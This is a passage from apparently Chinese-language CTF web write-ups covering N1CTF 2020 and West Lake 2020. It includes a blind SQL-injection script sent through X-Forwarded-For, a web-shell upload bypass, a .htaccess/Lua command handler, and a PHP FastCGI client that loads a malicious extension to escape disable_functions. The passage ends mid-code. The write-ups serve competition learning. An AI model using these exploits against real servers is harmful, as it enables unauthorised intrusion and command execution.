LOAD_FILE(<span class="hljs-string">&#x27;/flag&#x27;</span><br><br></code></pre></td></tr></table></figure><p>爆破使用的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>url = <span class="hljs-string">&#x27;http://101.32.205.189/?input=O:4:%22flag%22:2:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;s:5:%22check%22;N;&#125;&#x27;</span><br><br>session = requests.Session()<br><br><br><span class="hljs-comment"># 生成库名表名字符所在的字符列表字典</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ascii_str</span>():</span><br>    str_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):  <span class="hljs-comment"># 所有可显示字符</span><br>        str_list.append(chr(i))<br>    <span class="hljs-comment"># print(&#x27;可显示字符：%s&#x27;%str_list)</span><br>    <span class="hljs-comment"># # 返回字符列表</span><br>    <span class="hljs-keyword">return</span> str_list<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">sql</span>):</span><br>    payload = <span class="hljs-string">&quot;1&#x27;+(select (&quot;</span> + sql + <span class="hljs-string">&quot;) and exp(~(select * from (select user())n1ctf_websign)))+&#x27;&quot;</span><br>    print(payload)<br>    resp = session.get(<br>        url=url,<br>        headers=&#123;<span class="hljs-string">&quot;x-forwarded-for&quot;</span>: payload&#125;<br>    )<br>    soup = BeautifulSoup(markup=resp.text, features=<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><br>    <span class="hljs-comment"># 提取判读 True 和 False 的依据</span><br>    result = soup.find_all(name=<span class="hljs-string">&#x27;code&#x27;</span>)[<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># print(result)</span><br><br>    <span class="hljs-comment"># 执行成功返回 True</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;n1ctf2020&quot;</span> <span class="hljs-keyword">in</span> result.text:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-comment"># 用于测试函数是否正常执行（使用 while 不方便）</span><br><span class="hljs-comment"># param = f&quot;substr(database(), 1, 1)=&#x27;n&#x27;&quot;</span><br><span class="hljs-comment"># result = query(param)</span><br><span class="hljs-comment"># print(result)</span><br><br><span class="hljs-comment"># 不同的字典</span><br>CHAR_DICTIONARY1 = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + [<span class="hljs-string">&#x27;\\_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>]<br>CHAR_DICTIONARY2 = ascii_str()<br><br><span class="hljs-comment"># find 用于存储已找到的字符</span><br>find = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># 使用 ascii 作用判断依据更好。</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    f = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>, <span class="hljs-number">127</span>):<br>        pos = len(find) + <span class="hljs-number">1</span><br>        s = <span class="hljs-string">&#x27;select table_name from information_schema.tables where table_schema=DATABASE() limit 1,1&#x27;</span><br>        <span class="hljs-comment"># 使用 ascii 码进行判断（更优）</span><br>        param = <span class="hljs-string">f&quot;ascii(substr((<span class="hljs-subst">&#123;s&#125;</span>), <span class="hljs-subst">&#123;pos&#125;</span>, 1))=&#x27;<span class="hljs-subst">&#123;c&#125;</span>&#x27;&quot;</span><br>        <span class="hljs-comment"># 使用 char 进行字符判断。</span><br>        <span class="hljs-comment"># param = f&quot;substr((&#123;s&#125;), &#123;pos&#125;, 1)=&#x27;&#123;c&#125;&#x27;&quot;</span><br>        result = query(param)<br>        <span class="hljs-keyword">if</span> result:<br>            f = <span class="hljs-literal">True</span><br>            find += chr(c)<br>            print(find)<br>            print(<span class="hljs-string">&#x27;-------------------------&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> f:<br>        <span class="hljs-keyword">break</span><br>print(find)<br><br></code></pre></td></tr></table></figure><p>参考教程：</p><ol><li>你真的了解 IP 吗，PHP 如何严格获取真实用户 IP？：<a href="https://learnku.com/laravel/t/3905/do-you-really-know-ip-how-do-php-get-the-real-user-ip">https://learnku.com/laravel/t/3905/do-you-really-know-ip-how-do-php-get-the-real-user-ip</a></li><li>Bugku INSERT INTO注入(时间盲注）：<a href="https://blog.csdn.net/qq_37873738/article/details/85633897">https://blog.csdn.net/qq_37873738/article/details/85633897</a></li></ol><hr><p>后面的题目以后有时间补补（占坑</p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2020年10月西湖论剑CTF部分web题解</title>
    <link href="/2020/10/14/2020%E5%B9%B410%E6%9C%8814%E6%97%A5-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
    <url>/2020/10/14/2020%E5%B9%B410%E6%9C%8814%E6%97%A5-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</url>
    
    <content type="html"><![CDATA[<p>题目质量很高。</p><hr><a id="more"></a><h1 id="NewUpload（php-fpm任意代码执行）"><a href="#NewUpload（php-fpm任意代码执行）" class="headerlink" title="NewUpload（php-fpm任意代码执行）"></a>NewUpload（php-fpm任意代码执行）</h1><ul><li>使用 Burpsuite 进行文件上传一句话，文件名使用换行绕过，上传内容 %00 截断绕过，post 内容使用 base64 加密，不然会被拦截。</li><li>查看 phpinfo 拿到题目较为明显的2个条件：<ol><li>disable_function，过滤了如下函数</li><li>open_basedir限制了如下目录</li></ol></li><li>读取根目录 var_dump(scandir(“/“));发现 flag 文件和 readflag 文件。</li><li>open_basedir 绕过尝试读取 2 个文件，查看flag文件（没有权限）、readflag文件（二进制文件）。</li><li>使用蚁剑连接，方便后面进行利用。</li></ul><p><strong>解法1:宝塔 Apache 默认安装的 lua 模块配合 htaccess 执行系统命令</strong></p><ul><li>编写并上传 .htaccess 文件</li><li>写一个 1.lua 进行命令执行即可拿到 flag{3be9f1618515e751892cef4cf16f820e}</li></ul><p><strong>.htaccess 文件</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">AddHandler </span>lua-<span class="hljs-keyword">script </span>.lua<br></code></pre></td></tr></table></figure><p><strong>1.lua</strong></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">require</span> <span class="hljs-string">&quot;string&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span><span class="hljs-params">(r)</span></span><br>    r.content_type = <span class="hljs-string">&quot;text/plain&quot;</span><br>    <span class="hljs-keyword">local</span> t = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>)<br>    <span class="hljs-keyword">local</span> a = t:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*all&quot;</span>)<br>    r:puts(a)<br><br><br>    <span class="hljs-keyword">if</span> r.method == <span class="hljs-string">&#x27;GET&#x27;</span> <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>( r:parseargs() ) <span class="hljs-keyword">do</span><br>            r:puts( <span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, k, v) )<br>        <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">else</span><br>        r:puts(<span class="hljs-string">&quot;Unsupported HTTP method &quot;</span> .. r.method)<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><strong>解法3：利用tmp下的php-fpm socket加载扩展（利用蚁剑插件）</strong></p><ul><li>编译并上传 ant.so。</li><li>上传蚁剑的加载拓展脚本 2.php</li><li>上传 s.php 执行函数</li><li>访问 s.php 得到 flag。 </li></ul><p><strong>方便执行代码（自己base64）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br><br>session = requests.Session()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    url = <span class="hljs-string">&quot;http://newupload.xhlj.wetolink.com/sandbox/i631kn4rq3skctfkab4d65uhuc/upload/5.php&quot;</span><br>    resp = session.post(<br>        url=url,<br>        data=&#123;<br>            <span class="hljs-string">&#x27;pass&#x27;</span>: input()<br>        &#125;<br>    )<br>    print(resp.text)<br>    print(<span class="hljs-string">&#x27;------------------------------------&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> VERSION_1            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> BEGIN_REQUEST        = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> PARAMS               = <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">const</span> STDIN                = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">const</span> STDOUT               = <span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">const</span> STDERR               = <span class="hljs-number">7</span>;<br>    <span class="hljs-keyword">const</span> DATA                 = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">const</span> GET_VALUES           = <span class="hljs-number">9</span>;<br>    <span class="hljs-keyword">const</span> GET_VALUES_RESULT    = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">const</span> UNKNOWN_TYPE         = <span class="hljs-number">11</span>;<br>    <span class="hljs-keyword">const</span> RESPONDER            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">protected</span> $keepAlive = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">protected</span> $_requests = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">protected</span> $_requestCounter = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildPacket</span>(<span class="hljs-params">$type, $content, $requestId = <span class="hljs-number">1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $offset = <span class="hljs-number">0</span>;<br>        $totLen = strlen($content);<br>        $buf    = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-comment">// Packets can be a maximum of 65535 bytes</span><br>            $part = substr($content, $offset, <span class="hljs-number">0xffff</span> - <span class="hljs-number">8</span>);<br>            $segLen = strlen($part);<br>            $buf .= chr(<span class="hljs-built_in">self</span>::VERSION_1)        <span class="hljs-comment">/* version */</span><br>                . chr($type)                    <span class="hljs-comment">/* type */</span><br>                . chr(($requestId &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-comment">/* requestIdB1 */</span><br>                . chr($requestId &amp; <span class="hljs-number">0xFF</span>)        <span class="hljs-comment">/* requestIdB0 */</span><br>                . chr(($segLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>)    <span class="hljs-comment">/* contentLengthB1 */</span><br>                . chr($segLen &amp; <span class="hljs-number">0xFF</span>)           <span class="hljs-comment">/* contentLengthB0 */</span><br>                . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* paddingLength */</span><br>                . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* reserved */</span><br>                . $part;                        <span class="hljs-comment">/* content */</span><br>            $offset += $segLen;<br>        &#125; <span class="hljs-keyword">while</span> ($offset &lt; $totLen);<br>        <span class="hljs-keyword">return</span> $buf;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildNvpair</span>(<span class="hljs-params">$name, $value</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $nlen = strlen($name);<br>        $vlen = strlen($value);<br>        <span class="hljs-keyword">if</span> ($nlen &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* nameLengthB0 */</span><br>            $nvpair = chr($nlen);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span><br>            $nvpair = chr(($nlen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr(($nlen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(($nlen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr($nlen &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ($vlen &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* valueLengthB0 */</span><br>            $nvpair .= chr($vlen);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span><br>            $nvpair .= chr(($vlen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr(($vlen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(($vlen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr($vlen &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-comment">/* nameData &amp; valueData */</span><br>        <span class="hljs-keyword">return</span> $nvpair . $name . $value;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readNvpair</span>(<span class="hljs-params">$data, $length = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> ($length === <span class="hljs-literal">null</span>) &#123;<br>            $length = strlen($data);<br>        &#125;<br>        $array = <span class="hljs-keyword">array</span>();<br>        $p = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ($p != $length) &#123;<br>            $nlen = ord($data&#123;$p++&#125;);<br>            <span class="hljs-keyword">if</span> ($nlen &gt;= <span class="hljs-number">128</span>) &#123;<br>                $nlen = ($nlen &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);<br>                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">16</span>);<br>                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">8</span>);<br>                $nlen |= (ord($data&#123;$p++&#125;));<br>            &#125;<br>            $vlen = ord($data&#123;$p++&#125;);<br>            <span class="hljs-keyword">if</span> ($vlen &gt;= <span class="hljs-number">128</span>) &#123;<br>                $vlen = ($nlen &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);<br>                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">16</span>);<br>                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">8</span>);<br>                $vlen |= (ord($data&#123;$p++&#125;));<br>            &#125;<br>            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);<br>            $p += ($nlen + $vlen);<br>        &#125;<br>        <span class="hljs-keyword">return</span> $array;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildAllPacket</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $params, $stdin</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// Ensure new requestID is not already being tracked</span><br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_requestCounter++;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_requestCounter &gt;= <span class="hljs-number">65536</span> <span class="hljs-comment">/* or (1 &lt;&lt; 16) */</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;_requestCounter = <span class="hljs-number">1</span>;<br>            &#125;<br>            $id = <span class="hljs-keyword">$this</span>-&gt;_requestCounter;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;_requests[$id]));<br>        $request = <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::BEGIN_REQUEST, chr(<span class="hljs-number">0</span>) . chr(<span class="hljs-built_in">self</span>::RESPONDER) . chr((<span class="hljs-keyword">int</span>) <span class="hljs-keyword">$this</span>-&gt;keepAlive) . str_repeat(chr(<span class="hljs-number">0</span>), <span class="hljs-number">5</span>), $id);<br>        $paramsRequest = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> ($params <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>            $paramsRequest .= <span class="hljs-keyword">$this</span>-&gt;buildNvpair($key, $value, $id);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ($paramsRequest) &#123;<br>            $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, $paramsRequest, $id);<br>        &#125;<br>        $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, <span class="hljs-string">&#x27;&#x27;</span>, $id);<br>        <span class="hljs-keyword">if</span> ($stdin) &#123;<br>            $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, $stdin, $id);<br>        &#125;<br>        $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, <span class="hljs-string">&#x27;&#x27;</span>, $id);<br>        <span class="hljs-keyword">return</span> $request;<br>    &#125;<br>&#125;<br>$sock = stream_socket_client(<span class="hljs-string">&quot;unix:///tmp/php-cgi-74.sock&quot;</span>, $errno, $errstr);<br>$client = <span class="hljs-keyword">new</span> Client();<br>$payload_file = <span class="hljs-string">&quot;/www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload/s.php&quot;</span>;<br>$params = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>    <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; $payload_file,<br>    <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span> =&gt; <span class="hljs-string">&quot;extension_dir = /www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload\nextension = 1.so&quot;</span>,<br>    <span class="hljs-comment">//这里$payload_file。是我们调用恶意so执行的php命令。extension_dir是扩展目录extension是扩展名</span><br>);<br>$data = $client-&gt;buildAllPacket($params, <span class="hljs-string">&#x27;&#x27;</span>);<br>fwrite($sock, $data);<br>var_dump(fread($sock, <span class="hljs-number">4096</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>s.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> antsystem(<span class="hljs-string">&quot;/readflag&quot;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>参考教程：</p><ol><li>从一道CTF学习Fastcgi绕过姿势：<a href="https://www.anquanke.com/post/id/186186#h2-4">https://www.anquanke.com/post/id/186186#h2-4</a></li><li>2019 0ctf final Web Writeup（1）：<a href="https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/">https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/</a></li><li>php 自定义恶意扩展 so 编写过程：<a href="https://xz.aliyun.com/t/7330#toc-3">https://xz.aliyun.com/t/7330#toc-3</a></li><li>Fastcgi 协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a> </li><li>西湖论剑初赛Web1/5：<a href="https://guokeya.github.io/post/qKqMPs-ml/">https://guokeya.github.io/post/qKqMPs-ml/</a></li></ol><hr><h1 id="EasyJson（php-审计）"><a href="#EasyJson（php-审计）" class="headerlink" title="EasyJson（php 审计）"></a>EasyJson（php 审计）</h1><p><strong>基本步骤</strong></p><ul><li>filename=index.php 可过 check</li><li>使用 application/json 类型的 enctype 发送构造好的数据包</li><li>使用 burpsuite 将关键代码转 unicode，发送后得到地址。(不用改 x-Forward-For 也可以)</li><li>执行命令：<br><a href="http://easyjson.xhlj.wetolink.com/sandbox/7b9ef9125d41695d113f4d1d2d245886aaa89edc/?0=system&amp;1=/readflag">http://easyjson.xhlj.wetolink.com/sandbox/7b9ef9125d41695d113f4d1d2d245886aaa89edc/?0=system&amp;1=/readflag</a></li><li>得到 flag{a5db5397505f825334aa4dfc17d3bb9f} Powered By Dbapp OSS.</li></ul><p><strong>题目源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;security.php&#x27;</span>;<br><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;source&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br>$sandbox = <span class="hljs-string">&#x27;sandbox/&#x27;</span>.sha1($_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]).<span class="hljs-string">&#x27;/&#x27;</span>;<br>var_dump($sandbox);<br><span class="hljs-keyword">if</span>(!file_exists($sandbox))&#123;<br>    mkdir($sandbox);<br>    file_put_contents($sandbox.<span class="hljs-string">&quot;index.php&quot;</span>,<span class="hljs-string">&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;</span>);<br>&#125;<br>$action = $_GET[<span class="hljs-string">&#x27;action&#x27;</span>];<br>$content = file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br><br><span class="hljs-keyword">if</span>($action == <span class="hljs-string">&quot;write&quot;</span> &amp;&amp;  SecurityCheck(<span class="hljs-string">&#x27;filename&#x27;</span>,$_GET[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp;SecurityCheck(<span class="hljs-string">&#x27;content&#x27;</span>,$content))&#123;<br>    $content = json_decode($content);<br>    $filename = $_GET[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    $filecontent = $content-&gt;content;<br>    $filename = $sandbox.$filename;<br>    